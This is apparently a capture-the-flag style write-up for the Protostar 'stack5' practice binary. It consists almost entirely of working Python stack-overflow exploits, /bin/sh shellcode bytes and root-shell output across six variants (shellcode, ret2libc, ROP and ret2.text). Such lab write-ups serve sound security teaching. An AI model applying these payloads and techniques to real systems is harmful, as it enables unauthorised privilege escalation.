# Stack5

## Solution
Finding the offset to %eip.
```
(gdb) r
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

The solution is actually just the "classic" buffer overflow exploit. So we'll skip over it in the
shells section.
```py
import struct

off = 76

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0xbffff750 + off + 0x80)

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack5
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## Shells

### Ret2libc
```py
import struct

off = 76

pad = 'A' * off

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

print pad + system + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### Rop Chain to Shellcode
```py
import struct

off = 76

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x080483da)
ret += struct.pack('I', 0xbffff750 + off + 0x80) 

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack5
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### Rop Chain to Libc
```py
import struct

off = 76

pad = 'A' * off

ret = struct.pack('I', 0x080483da)

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

print pad + ret + system + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### Ret2.text to Shellcode
```py
import struct

off = 76

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x08048447)

ret += 'AAAA' # POP
ret += 'AAAA' # POP
ret += struct.pack('I', 0xbffff750 + off + 0x80) # RET

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack5
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### Ret2.text to Libc
```py
import struct

off = 76

pad = 'A' * off

ret = struct.pack('I', 0x08048447)

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

ret += 'AAAA' # POP
ret += 'AAAA' # POP
ret += system # RET

print pad + ret + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

